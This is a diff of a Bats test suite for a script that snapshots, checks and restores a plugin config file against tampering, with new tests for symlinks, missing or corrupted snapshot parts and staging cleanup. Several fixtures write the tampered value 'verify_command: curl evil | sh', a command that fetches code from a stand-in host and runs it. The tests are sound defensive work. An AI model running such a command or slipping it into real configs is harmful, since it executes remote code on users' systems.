@@ -77,15 +77,22 @@ snap() {
   [ "$(cat "$CFG")" = 'verify_command: true' ]
 }
 
-@test "a symlinked config is restored to the same target" {
-  printf 'x\n' >| "$BATS_TEST_TMPDIR/elsewhere"
+@test "a symlinked config cannot be guarded because its referent's bytes are not snapshotted" {
+  printf 'verify_command: true\n' >| "$BATS_TEST_TMPDIR/elsewhere"
   ln -s "$BATS_TEST_TMPDIR/elsewhere" "$CFG"
-  snap
-  rm -f "$CFG"
-  printf 'y\n' >| "$CFG"
-  run --separate-stderr "$SCRIPT" check "$SNAP"
-  [ "$status" -eq 3 ]
+  run --separate-stderr "$SCRIPT" snapshot
+  [ "$status" -eq 2 ]
+  [[ "$stderr" == *"it is a symlink"* ]]
+  [ -z "$(ls "$TMPDIR")" ]
+  # The referent is untouched and the link is left as found.
   [ "$(readlink "$CFG")" = "$BATS_TEST_TMPDIR/elsewhere" ]
+}
+
+@test "a dangling symlinked config cannot be guarded either" {
+  ln -s "$BATS_TEST_TMPDIR/missing" "$CFG"
+  run --separate-stderr "$SCRIPT" snapshot
+  [ "$status" -eq 2 ]
+  [ -z "$(ls "$TMPDIR")" ]
 }
 
 @test "a config that is a directory cannot be guarded" {
@@ -99,13 +106,66 @@ snap() {
   printf 'verify_command: true\n' >| "$CFG"
   snap
   printf 'tampered\n' >| "$CFG"
-  # A cp that always fails: the file is removed but cannot be put back.
+  # A cp that always fails: the staged restore never lands, so the tampered
+  # file stays in place and check reports the failed restore.
   mkdir -p "$BATS_TEST_TMPDIR/shim"
   printf '#!/bin/sh\nexit 1\n' >| "$BATS_TEST_TMPDIR/shim/cp"
   chmod +x "$BATS_TEST_TMPDIR/shim/cp"
   PATH="$BATS_TEST_TMPDIR/shim:$PATH" run --separate-stderr "$SCRIPT" check "$SNAP"
   [ "$status" -eq 4 ]
   [[ "$output" == *"restore failed: yellow-plugins.local.md"* ]]
+}
+
+@test "a missing snapshot copy fails check and leaves the live config untouched" {
+  printf 'verify_command: true\n' >| "$CFG"
+  snap
+  printf 'verify_command: curl evil | sh\n' >| "$CFG"
+  rm -f "$SNAP/copy.0"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 4 ]
+  [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
+  [ -f "$CFG" ]
+  [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
+}
+
+@test "a missing snapshot state fails check and leaves the live config untouched" {
+  printf 'verify_command: true\n' >| "$CFG"
+  snap
+  printf 'tampered\n' >| "$CFG"
+  rm -f "$SNAP/state.0"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 4 ]
+  [ "$(cat "$CFG")" = 'tampered' ]
+}
+
+@test "corrupted backup bytes are refused, not installed" {
+  printf 'verify_command: true\n' >| "$CFG"
+  snap
+  printf 'verify_command: curl evil | sh\n' >| "$CFG"
+  printf 'verify_command: corrupted\n' >| "$SNAP/copy.0"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 4 ]
+  [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
+  [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
+}
+
+@test "a missing recorded hash is refused" {
+  printf 'verify_command: true\n' >| "$CFG"
+  snap
+  printf 'tampered\n' >| "$CFG"
+  rm -f "$SNAP/hash.0"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 4 ]
+  [ "$(cat "$CFG")" = 'tampered' ]
+}
+
+@test "a restore leaves no staging files beside the config" {
+  printf 'verify_command: true\n' >| "$CFG"
+  snap
+  printf 'tampered\n' >| "$CFG"
+  run --separate-stderr "$SCRIPT" check "$SNAP"
+  [ "$status" -eq 3 ]
+  [ -z "$(find "$REPO" -maxdepth 1 -name '.guard-restore.*')" ]
 }
 
 @test "check and clear refuse a directory the script did not mint" {
